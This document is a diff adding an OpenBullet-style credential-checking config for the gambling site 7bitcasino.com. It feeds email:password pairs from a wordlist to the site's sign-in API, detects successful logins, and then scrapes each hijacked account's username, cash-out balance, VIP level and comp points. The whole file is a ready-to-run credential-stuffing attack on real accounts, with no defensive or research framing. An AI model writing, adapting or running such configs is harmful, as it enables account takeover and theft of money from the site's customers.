@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "7BitCasino by matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-17T16:49:12.6110209+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.7bitcasino.com/api/users/sign_in" 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture REQUEST GET "https://www.7bitcasino.com/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<li class='name'>" 
+  KEYCHAIN Failure OR 
+    KEY "Log in" 
+
+#Username PARSE "<SOURCE>" LR "<li class='name'>" "</li>" -> CAP "Username" 
+
+#Currency PARSE "<SOURCE>" LR "<th>Available to cash out</th>" "<td class='payments-actions'>" -> VAR "Currency|Amount|Cashout" 
+
+#Translate FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "<th>Actions</th>" VALUE "" 
+  KEY "</tr>" VALUE "" 
+  KEY "</thead>" VALUE "" 
+  KEY "<tbody>" VALUE "" 
+  KEY "<tr class='active'>" VALUE "" 
+  KEY "<td class='status'>" VALUE "" 
+  KEY "<div class='account-active-mark'>" VALUE "" 
+  KEY "<i class='fa fa-check'></i>" VALUE "" 
+  KEY "Active" VALUE "" 
+  KEY "</div>" VALUE "" 
+  KEY "</td>" VALUE "" 
+  KEY "<td>" VALUE "" 
+  "<Currency|Amount|Cashout>" -> CAP "Currency|Amount|Cashout" 
+
+#Status PARSE "<SOURCE>" LR "<h2>Current Status" "</span>" -> VAR "Status" 
+
+#Translate FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-01'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-02'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-03'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-04'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-05'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-06'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-07'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-08'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-09'>" VALUE "" 
+  KEY "</h2><span class='profile-label-large profile-label-inactive Vip-level-10'" VALUE ">" 
+  "<Status>" -> CAP "Status" 
+
+#Points PARSE "<SOURCE>" LR "Status Comp Points: " "</p><div" -> CAP "Points" 
+
